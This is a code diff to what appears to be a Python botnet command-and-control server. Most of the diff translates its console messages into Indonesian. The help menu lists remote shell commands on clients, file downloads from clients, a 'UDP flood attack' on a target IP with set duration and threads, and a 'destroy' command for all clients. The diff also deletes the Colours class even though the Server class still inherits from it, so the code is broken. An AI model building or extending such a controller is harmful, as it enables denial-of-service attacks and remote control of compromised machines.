@@ -175,8 +175,8 @@ class Session:
 	def cmd_help(self):
 		help = [
 			"<command> : shell command to client",
-			"download <file>: Download file from client",
-			"exit: Exit from client",
+			"download <file>: Download file dari client",
+			"exit: Exit dari client",
 		]
 		print("----Command List----")
 		for h in help:
@@ -223,24 +223,6 @@ class Session:
 		return res
 
 
-class Colours():
-	def __init__(self):
-		self.colours_fn = {}
-		self.colours = []
-		if platform.system() == 'Windows':
-			kernel32 = ctypes.windll.kernel32
-			kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
-
-	def _gen(self,string, prefix, key):
-		colored = prefix if prefix else string
-		not_colored = string if prefix else ''
-		result = '\033[{}m{}\033[0m{}'.format(key, colored, not_colored)
-		return result
-
-	def cprint(self, string:str):
-		print(choice(list(self.colours_fn.values()))(string))
-
-
 class Server(Colours):
 	def __init__(self, connect:Tuple[str,int]=(host, port), auth:str=""):
 		super().__init__()
@@ -266,7 +248,7 @@ class Server(Colours):
 
 		self.take_input()
 	def exit_gracefully(self,signum:Union[str,object]="", frame:Union[str,object]=""):
-		print("\nExiting....")
+		print("\Keluar Program....")
 		self.stop = True
 		self.sock.close()
 		sleep(1)
@@ -291,7 +273,7 @@ class Server(Colours):
 			except socket.error:
 				continue
 			except Exception as e:
-				print("Error accepting connections")
+				print("Error menerima koneksi!")
 
 	def _is_socket_closed(self, sock: socket.socket) -> bool:
 		try:
@@ -378,13 +360,12 @@ class Server(Colours):
 
 	def cmd_list(self):
 		if len(self.connections) == 0:
-			print("No clients connected")
+			print("Tidak ada client terhubung!")
 			return
 
 		print("----Clients----")
 		for i, conn in self.get_connection():
 			ip, port = conn.getpeername()
-			#self.cprint(f"{[i]}    {ip}:{port}    CONNECTED")
 			print(f"{[i]}    {ip}:{port}    CONNECTED")
 	
 	def cmd_reset(self):
@@ -394,15 +375,15 @@ class Server(Colours):
 
 	def cmd_help(self):
 		help = [
-			"list - list all connected clients",
-			"ping - ping all clients",
-			"connect <client_id> - connect to a client",
-			"attack <ip> <port> <duration> <threads> - UDP flood attack on target",
-			"tasklist - list all running tasks",
-			"kill <task_id> - kill a task",
-			"killall - kill all tasks",
-			"destroy - destroy all clients",
-			"help - show this help message"
+			"list - list client yang terhubung",
+			"ping - ping semua client",
+			"connect <client_id> - menghubung ke client",
+			"attack <ip> <port> <duration> <threads> - UDP flood attack ke dalam target",
+			"tasklist - list tugas yang sedang berjalan",
+			"kill <task_id> - menghentikan tugas",
+			"killall - menghentikan semua tugas yang ada",
+			"destroy - menghapus semua client",
+			"help - menampilkan pesan"
 		]
 		print("----Command List----")
 		for h in help:
@@ -411,7 +392,7 @@ class Server(Colours):
 	
 	def cmd_tasklist(self):
 		if len(self.tasks) == 0:
-			print("No tasks running")
+			print("Tidak ada tugas sedang berjalan!")
 			return
 		print("----Tasks----")
 		for hash, task in self.tasks.copy().items():
@@ -430,7 +411,7 @@ class Server(Colours):
 	def cmd_kill(self, hash:int):
 		hash = int(hash)
 		if hash not in self.tasks:
-			print("Invalid task id")
+			print("Task id tidak benar")
 			return
 		del self.tasks[hash]
 		self.send(Request(cmd="KILL", body=dict(params=hash)))
